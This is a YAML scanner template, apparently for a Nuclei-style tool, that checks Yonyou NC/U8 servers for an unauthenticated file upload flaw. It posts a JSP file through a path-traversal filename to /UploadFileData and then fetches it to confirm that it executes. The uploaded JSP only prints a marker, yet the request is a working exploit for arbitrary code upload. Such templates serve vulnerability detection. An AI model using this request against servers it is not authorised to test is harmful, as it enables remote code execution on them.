id: yaml-poc-yonyou-yonyou_nc-file_upload-CT-456684
info:
  name: Yaml Poc Yonyou Yonyou_Nc File_Upload Ct 456684
  author: converted
  severity: critical
  description: 'Converted from xpoc: yaml-poc-yonyou-yonyou_nc-file_upload-CT-456684'
  tags: fileupload
  reference:
  - https://github.com/onMey/SRC/blob/main/u8_upload.py
http:
- method: POST
  path:
  - /UploadFileData?action=upload_file&filename=../.{{randomFilename}}.jsp
  body: "------WebKitFormBoundary{{randomBoundary}}\r\nContent-Disposition: form-data;\
    \ name=\"upload\"; filename=\"{{randomFilename}}.jsp\"\r\nContent-Type: application/octet-stream\r\
    \n\r\n<% {out.print(\"{{r1}}\");} %>\r\n------WebKitFormBoundary{{randomBoundary}}\r\
    \nContent-Disposition: form-data; name=\"submit\"\r\n\r\nsubmit\r\n------WebKitFormBoundary{{randomBoundary}}--"
  headers:
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{randomBoundary}}
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - showSucceedMsg
- method: GET
  path:
  - /R9iPortal/.{{randomFilename}}.jsp
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
